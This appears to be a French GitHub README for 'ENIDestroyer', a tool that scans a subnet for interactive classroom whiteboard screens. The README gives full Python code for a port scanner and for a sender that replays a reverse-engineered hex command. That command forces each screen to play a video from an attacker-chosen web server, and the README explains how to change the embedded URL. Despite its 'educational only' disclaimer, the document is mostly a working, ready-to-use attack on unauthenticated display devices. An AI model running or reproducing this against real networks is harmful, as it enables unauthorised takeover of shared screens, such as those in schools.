# 🖥️ ENIDestroyer

## Introduction
**ENIDestroyer** est un outil d'analyse réseau et de contrôle à distance spécialisé dans la connexion simultanée aux Écrans Numériques Interactifs (ENI). Ce programme permet de scanner un réseau local, d'identifier les ENI accessibles, puis d'établir des connexions pour diffuser du contenu média.

## ⚠️ Avertissement
Ce programme est fourni à des fins éducatives uniquement. L'auteur décline toute responsabilité quant à son utilisation. Cet outil est :
- Très spécifique dans son fonctionnement
- Peu flexible
- À utiliser uniquement dans des environnements contrôlés et avec autorisation

## 🔧 Prérequis
- Python 3.x
- Un serveur web local pour héberger les médias

## 📋 Installation
```bash
# Cloner le dépôt
git clone https://github.com/Arthur-91140/ENIDestroyer.git

# Accéder au répertoire
cd ENIDestroyer
```

## 🚀 Utilisation

### 1. Configuration
- Configurez le sous-réseau à analyser (par défaut: `172.16.30.0/24`)
- Préparez un serveur web contenant les médias à diffuser
- Définissez l'URL du média dans le script principal

### 2. Lancement

```bash
python LAN-WLAN-Scan.py
```
Puis...
```bash
python Request-Sender.py
```

### 3. Options d'optimisation
- Pour accélérer le processus, vous pouvez sauter l'étape de scan en important directement un fichier `ipv.csv` généré par Nmap
- Format attendu pour `ipv.csv`:
  ```
  IP,Open Ports
  172.16.30.50,20121
  172.16.30.51,"20121, 20194"
  ```

## 🛠️ Code source et fonctionnalités

### Module de scan réseau (`LAN-WLAN-Scan.py`)

```python
import socket
import csv
import ipaddress
from concurrent.futures import ThreadPoolExecutor

def scan_port(ip_port_tuple):
    ip, port = ip_port_tuple
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
            sock.settimeout(1)
            result = sock.connect_ex((ip, port))
            if result == 0:
                return ip, port
    except socket.error:
        return None

def scan_ports(ip, ports):
    ip_port_tuples = [(ip, port) for port in ports]
    
    with ThreadPoolExecutor(max_workers=20) as executor:
        results = list(executor.map(scan_port, ip_port_tuples))
    
    open_ports = [port for result in results if result for ip, port in [result]]
    return open_ports

def main():
    subnet = "172.16.30.0/24"
    ports_to_scan = [20121, 20194]
    output_file = "ipv.csv"
    
    with open(output_file, 'w', newline='') as csvfile:
        fieldnames = ['IP', 'Open Ports']
        writer = csv.DictWriter(csvfile, fieldnames=fieldnames)
        writer.writeheader()
        network = ipaddress.ip_network(subnet)
        for ip in network.hosts():
            ip_str = str(ip)
            print(f"Scanning IP: {ip_str}...")
            open_ports = scan_ports(ip_str, ports_to_scan)
            if open_ports:
                writer.writerow({'IP': ip_str, 'Open Ports': ', '.join(map(str, open_ports))})
                print(f"Found open ports {', '.join(map(str, open_ports))} on {ip_str}")
    print("Scan completed. Results saved in ipv.csv")

if __name__ == "__main__":
    main()
```

### Module de connexion ENI (`Request-Sender.py`)

```python
import socket

# Définir les détails de la connexion
host = '172.16.30.50'
port = 20121

# Créer une socket
with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
    # Se connecter au serveur
    s.connect((host, port))
    
    # Définir la nouvelle requête en tant que chaîne hexadécimale lisible
    hex_request = "257c770600000000000004d2010000000780000004384465736b74706f702d5635374c31305309290000342e352e35040d01000400000004640000040000000400000004004c01002e4a01007765622d3e687474703a2f2f3137322e31362e33302e392f566964656f2f47616d65706c61792e6d7034300400000004000000044a0006044c01020421010004010101"
    request = bytes.fromhex(hex_request)
    
    # Envoyer la nouvelle requête
    s.sendall(request)
    
    # Recevoir la réponse du serveur (si nécessaire)
    response = s.recv(1024)
    print("Réponse du serveur:", response)
```

## 📊 Fonctionnement détaillé

1. **Scan réseau** (`LAN-WLAN-Scan.py`):
   - Parcourt toutes les adresses IP du sous-réseau spécifié (`172.16.30.0/24` par défaut)
   - Vérifie les ports 20121 et 20194 pour chaque adresse IP
   - Enregistre les résultats dans un fichier CSV (`ipv.csv`)
   - Utilise `ThreadPoolExecutor` pour effectuer plusieurs scans en parallèle

2. **Connexion aux ENI** (`Request-Sender.py`):
   - Établit une connexion TCP à l'IP et au port spécifiés
   - Envoie une commande formatée en hexadécimal pour contrôler l'ENI
   - La commande contient des informations sur le média à diffuser
   - Capture la réponse du serveur pour vérification

3. **Analyse de la commande hexadécimale**:
   - `257c7706...` : Séquence d'en-tête du protocole
   - `...7765622d3e687474703a2f2f3137322e31362e33302e392f566964656f2f47616d65706c61792e6d7034...` : Contient l'URL du média encodée
   - Le reste de la séquence contient des paramètres de configuration

## 🔍 Explications supplémentaires

### Détail du scanner réseau
Le scanner utilise une approche multithreading pour accélérer les scans:
- Chaque IP est testée pour vérifier si les ports spécifiés sont ouverts
- Les résultats sont enregistrés uniquement si au moins un port est ouvert
- Le format CSV permet une exploitation facile des résultats

### Détail de la connexion ENI
La connexion utilise un protocole propriétaire:
- La socket TCP est créée et connectée à l'ENI
- La commande hexadécimale est envoyée pour configurer l'affichage
- Changez l'URL dans la commande hexadécimale pour diffuser un média différent

## 🛡️ Sécurité et bonnes pratiques
- Utilisez ce programme uniquement sur des réseaux dont vous êtes propriétaire
- Vérifiez toujours les autorisations avant de scanner un réseau
- Assurez-vous que le contenu diffusé est approprié et légal
- Limitez l'utilisation aux environnements de test ou de démonstration

## 📚 Références
- Documentation des protocoles ENI
- Rétro-Ingénierie par scan réseau intensif

## Authors
- [Arthur Pruvost Rivière](https://github.com/Arthur-91140) 
